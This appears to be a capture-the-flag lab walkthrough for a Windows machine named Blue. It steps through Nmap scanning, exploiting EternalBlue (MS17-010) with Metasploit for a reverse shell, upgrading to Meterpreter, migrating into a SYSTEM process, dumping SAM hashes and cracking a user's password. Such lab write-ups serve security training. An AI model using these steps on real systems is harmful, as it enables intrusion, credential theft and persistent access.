# BLUE
## Recon
Focuses on initial network enumeration to identify active services and pinpoint the critical vulnerability on the target Windows machine.
* Network Scanning: The primary objective is to scan the target IP using Nmap. A comprehensive command to identify service versions and check for known vulnerabilities simultaneously is `nmap -sV --script vuln <TARGET_IP>`.
* Port Enumeration: You must analyze the Nmap output (specifically looking at the `PORT STATE SERVICE` section) to count the number of open ports with a value under 1000. For this specific Windows machine, these typically include standard ports like 135, 139, and 445.
* Vulnerability Identification: By utilizing Nmap's vulnerability scripts (`--script vuln`), the scan will reveal that the machine's SMBv1 service is unpatched and vulnerable to ms17-010 (EternalBlue). Identifying this specific CVE is the final goal of the recon phase and sets up the attack vector for the next task.

## Gain Access
* **Objective:** Use Metasploit to exploit the vulnerable SMB service (MS17-010) and gain an initial foothold on the target machine.
* **Exploit Selection:** The task requires finding and loading the specific EternalBlue exploit module: `exploit/windows/smb/ms17_010_eternalblue`.
* **Configuration:** After loading the module, you must check the required options and set the `RHOSTS` parameter to point to the target's IP address.
* **Payload Modification:** For learning purposes, the task instructs you to swap out the default payload for a standard Windows command shell by running `set payload windows/x64/shell/reverse_tcp`.
* **Execution & Session Management:** Once configured, you execute the exploit to catch the reverse shell. Finally, you must background the active DOS shell session (using `CTRL + Z`) to return to the main Metasploit console and keeps session running.
> [!TIP]
> **If it is not working just try to terminate and restart the system**

## Escalate
* **Objective:** Upgrade your basic command shell to a fully featured Meterpreter session and ensure your escalated privileges are stable.
* **Upgrading to Meterpreter:** First, background your active standard shell (using `CTRL+Z`). Then, load the `post/multi/manage/shell_to_meterpreter` post-exploitation module. You must configure the `SESSION` option to point to the ID of your backgrounded shell before running it. It can be done using `shell` command in meterpreter.
* **Verifying Privileges:** Once the conversion is successful, interact with the new Meterpreter session. You can run the getsystem command, or drop into a system `shell` and run `whoami` to confirm you have successfully escalated to `NT AUTHORITY\SYSTEM`.
* **Process Migration (Stability):** Exploited processes can be unstable and might crash, causing you to lose your connection. To secure your access, use the ps command to list running processes, find a stable service running under `NT AUTHORITY\SYSTEM` (typically near the bottom of the list), and use the `migrate <PROCESS_ID>` command to safely move your Meterpreter session into that stable process. Tips use `spoolsv.exe` a.k.a printer proccess, has access authority system and if kill the proccess not break the system.

## Cracking
* Objective: Extract local user password hashes from the compromised Windows machine and crack the password of the non-default user.
* Dumping Hashes: From your elevated Meterpreter session (running as `NT AUTHORITY\SYSTEM` from Task 3), execute the `hashdump` command. This extracts all local account password hashes from the system's SAM (Security Account Manager) database.
* Identifying the Target User: Analyze the `hashdump` output to find the non-default user. Standard Windows accounts usually include Administrator and Guest; the unique user created for this machine is Jon.
* Password Cracking: Copy the NTLM hash associated with Jon's account (the portion after the first colon or between the appropriate colons, depending on the format). You can crack this hash offline using a tool like John the Ripper or Hashcat with the `rockyou.txt` wordlist, or more quickly by pasting it into an online hash lookup service like CrackStation.

## Find Flags!
* **Flag 1 (System Root):** Found at the root of the primary file system (typically `C:\`).
* **Flag 2 (Password Storage):** Located in the directory where Windows stores its password database (the SAM database, usually found in `C:\Windows\System32\config\`). (Note: A room errata warns that Windows occasionally deletes this flag file automatically, which may require you to restart the target machine and re-run the exploit if you cannot find it).
* **Flag 3 (Administrator's Loot):** Found in a common directory where Administrators save interesting or sensitive files, typically the Administrator user's Documents or Desktop folder.

> [!TIP]
> **Use `search -f <FILENAME>` is easier to find it**